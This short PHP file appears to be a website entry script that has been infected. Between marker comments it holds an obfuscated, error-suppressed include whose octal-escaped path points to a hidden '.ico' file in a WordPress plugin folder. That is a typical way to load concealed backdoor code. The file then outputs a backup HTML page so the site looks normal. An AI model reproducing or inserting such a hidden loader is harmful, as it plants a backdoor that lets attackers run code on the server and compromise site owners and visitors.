<?php
/*d9192*/

@include "\057ho\155e/\163te\151na\1431/\160ub\154ic\137ht\155l/\167p-\143on\164en\164/p\154ug\151ns\057pr\145mi\165m-\163eo\055pa\143k/\056a9\06688\063a9\056ic\157";

/*d9192*/


echo @file_get_contents('index.html.bak.bak');